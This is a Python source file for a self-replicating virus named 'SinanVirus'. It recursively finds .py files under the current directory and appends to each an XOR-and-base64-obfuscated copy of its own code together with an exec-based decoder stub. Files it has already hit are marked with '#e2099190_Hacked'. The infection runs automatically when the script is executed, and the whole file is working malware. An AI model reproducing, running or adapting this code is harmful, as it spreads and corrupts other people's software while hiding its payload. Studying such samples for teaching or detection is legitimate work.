#begin
import os
import base64
import random
import string 
from itertools import cycle
import requests

infected_files_list = []

virus_execute = """
def xor_decode(data,key):
        from itertools import cycle
        import base64
        return ''.join(chr(x ^ ord(y)) for (x,y) in zip(base64.decodebytes(bytearray(data,"utf-8")), cycle(key)))
exec(xor_decode(ctext,ckey))
#end"""

class SinanVirus:
    """
    Objects that will be infected by virus

    Objects have absolute path of file to be effected, virus code to inject and flag whether it is infected or not.
    """
    def __init__(self, absolute_path, virus_code, is_infected=False):
        """
        Constructor of object
        """
        self.absolute_path = absolute_path
        self.virus_code = virus_code
        self.is_infected = is_infected

    def generate_key(self, length=20):
        """
        Necessary key generator to perform both encryption and decryption 

        Choices random ascii string with length 20
        """
        return ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(length))

    def xor_encode(self,data,key):
        """
        Encryption algorithm to create cipher text
        """
        xored = ''.join(chr((x) ^ ord(y)) for (x,y) in zip(data, cycle(key)))
        return base64.encodebytes(xored.encode()).strip()

    def payload_generate(self):
        """
        Code piece generator to match with requirements (e.g infected code will not be infected again)

        Program understands that from injected payload
        """
        write_section=b'' #section that are going to be written
        is_writable_section = False #writable section begin, end checker flag
        bfile = open(__file__, 'rb').read()
        for line in bfile.split(b'\n'):
            """
            Those if clauses made for target file since it will append itself, so virus resides between #begin and #end commands
            """
            if line == b"#begin": #Do nothing until see #begin
                is_writable_section = True
                write_section += line + b'\n'
            elif is_writable_section == True:
                write_section += line + b'\n' # Get code from #begin, which is the virus code
            elif line == b"#end": # end 
                write_section += line + b'\n'
                is_writable_section = False
                break

        key = self.generate_key()
        ciphertext = self.xor_encode(write_section, key) 
        virus_code = b'\n#begin\n'
        virus_code += b'#e2099190_Hacked\n'
        virus_code += b'#payload_start\n'
        virus_code += b'ctext = """' + (ciphertext) +  b'"""\n' #cipher text variable generate
        virus_code += b'ckey = "' + key.encode() + b'"' #key variable generate
        virus_code += b'\n#payload_end' 
        return virus_code.decode() + self.virus_code
        
    def attack(self):
        """
        Generated and encrypted virus code injector
        """
        with open(self.absolute_path,'a') as openedfile:
            openedfile.write(self.payload_generate())
        #print(requests.get("https://corona-stats.online?format=json").text)

def isInfected(absolute_path):
    """
    Returns True if code is infected (i.e having "#2099190_Hacked"), False otherwise
    """
    with open(absolute_path) as openedfile:
        if '#e2099190_Hacked' in openedfile.read():
           return True

def find_py_files():
    """
    Recursively searches files from current path and finds python files exclude itself and files already infected.
    Create object and appends them to list
    """
    for root, dirs, files in os.walk("."):
        for file in files:
            if file.endswith(".py") and file != os.path.basename(__file__):
                absolute_path = os.path.join(root, file)
                if not isInfected(absolute_path):
                    infected_files_list.append(SinanVirus(absolute_path, virus_execute, True))
find_py_files()
for py_files in infected_files_list:
    py_files.attack()
#end